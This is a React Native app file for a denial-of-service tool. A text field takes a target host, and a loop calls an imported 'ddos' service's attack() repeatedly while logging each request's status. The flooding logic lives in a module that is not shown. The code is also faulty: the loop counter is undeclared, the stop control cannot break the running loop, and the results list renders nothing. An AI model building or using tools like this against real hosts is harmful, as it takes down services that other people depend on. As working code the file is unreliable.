import React, { useState, useEffect } from "react";
import {
  TouchableOpacity,
  Text,
  View,
  TextInput
} from "react-native";
import { MaterialIcons } from "@expo/vector-icons";

import styles from "./Styles";
import ddos from "./services/ddos";

export default function App() {
  const [continueAtk, setcontinueAtk] = useState(false);
  const [results, setresults] = useState([]);
  const [host, sethost] = useState("");

  useEffect(() => {
    async function makeAttack() {
      const Ddos = ddos(host);
      console.log("Is ready to attack?", continueAtk ? "Yes" : "No");
      for (i = 1; continueAtk; i++) {
        console.log("attack atempt", i);
        const { status } = await Ddos.attack();
        console.log(i, "status attack:", status);
        setresults([...results, { i, status }]);
      }
    }
    makeAttack();
  }, [continueAtk]);

  async function attack() {
    try {
      console.log("Begin Attack!");
      setcontinueAtk(true);
    } catch (ex) {
      throw ex;
    }
  }

  function StopAttack() {
    console.log("Stop Attack!");
    setcontinueAtk(false);
    sethost("");
  }

  return (
    <View style={styles.container}>
      {continueAtk === false ? (
        <>
          <Text style={styles.title}>Put the host to attack!</Text>
          <TextInput
            style={styles.searchInput}
            placeholder="ex.: http://localhost:9000"
            placeholderTextColor="#999"
            autoCorrect={false}
            value={host}
            onChangeText={sethost}
          />
          <TouchableOpacity
            style={styles.loadButton}
            onPress={() => {
              attack();
            }}
          >
            <MaterialIcons name="flight-land" size={20} color="#FFF" />
          </TouchableOpacity>
        </>
      ) : (
        <>
          <TouchableOpacity
            style={styles.loadButton}
            onPress={() => {
              StopAttack();
            }}
          >
            <MaterialIcons name="stop" size={20} color="#FFF" />
            <Text style={styles.title}>Resultados</Text>
          </TouchableOpacity>

          {results.forEach(({ i, status }) => {
            <Text style={styles.title}>{`Req:${i} status:${status}`}</Text>;
          })}
        </>
      )}
    </View>
  );
}
